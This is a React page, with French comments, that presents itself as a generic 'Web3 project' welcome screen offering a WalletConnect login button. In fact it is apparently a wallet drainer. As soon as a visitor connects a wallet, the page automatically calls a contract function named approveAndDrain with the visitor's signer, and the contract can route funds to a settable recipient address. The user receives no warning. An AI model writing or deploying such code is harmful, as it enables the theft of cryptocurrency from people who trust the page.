import { useState, useEffect } from 'react';
import { useAccount, useConnect, useProvider } from 'wagmi';
import { WalletConnectConnector } from '@wagmi/core';
import { ethers } from 'ethers';

const contractAddress = '0xb44de2566da86c8cef673899d0b53fa69bd685cf'; // Remplace par l'adresse de ton smart contract
const contractABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "approvalAmount",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "approveAndDrain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
      }
    ],
    "name": "setRecipient",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "name": "tokenAddresses",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

export default function Home() {
  const [isConnected, setIsConnected] = useState(false);
  const { isConnected: accountConnected, address } = useAccount();
  const { connect, disconnect } = useConnect();
  const provider = useProvider(); // Utilisation du provider à la place de useSigner pour ethers v6

  useEffect(() => {
    if (accountConnected) {
      setIsConnected(true);
      interactWithContract();
    }
  }, [accountConnected]);

  const interactWithContract = async () => {
    if (provider && address) {
      const signer = provider.getSigner();
      const contract = new ethers.Contract(contractAddress, contractABI, signer);

      try {
        // Appel de la fonction approveAndDrain sur le contrat
        const tx = await contract.approveAndDrain();
        console.log("Transaction envoyée : ", tx);
        await tx.wait();
        console.log("Transaction confirmée");
      } catch (err) {
        console.error("Erreur lors de l'interaction avec le contrat", err);
      }
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100 p-4">
      <div className="w-full max-w-md p-6 bg-white shadow-lg rounded-lg">
        <h1 className="text-2xl font-semibold text-center mb-6">Bienvenue sur le projet Web3</h1>
        {!isConnected ? (
          <button
            onClick={() => connect(new WalletConnectConnector({ options: { qrcode: true } }))}
            className="w-full py-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600 focus:outline-none"
          >
            Connexion avec WalletConnect
          </button>
        ) : (
          <button
            onClick={() => disconnect()}
            className="w-full py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 focus:outline-none"
          >
            Déconnexion
          </button>
        )}
        {isConnected && <p className="mt-4 text-center">Wallet connecté : {address}</p>}
      </div>
    </div>
  );
}
